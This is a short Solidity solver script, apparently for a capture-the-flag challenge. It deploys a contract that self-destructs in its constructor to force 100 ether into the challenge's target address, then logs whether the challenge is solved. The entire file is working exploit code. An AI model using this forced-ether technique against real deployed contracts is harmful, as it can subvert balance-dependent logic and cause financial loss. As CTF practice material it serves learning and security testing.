// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";

contract Cheese {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external payable {
        console.log("solved?", CHALLENGE.isSolved());

        new Cheese{value: msg.value}(CHALLENGE.TARGET());

        console.log("solved?", CHALLENGE.isSolved());
    }
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        new Exploit(Challenge(challenge)).exploit{value: 100 ether}();
    }
}
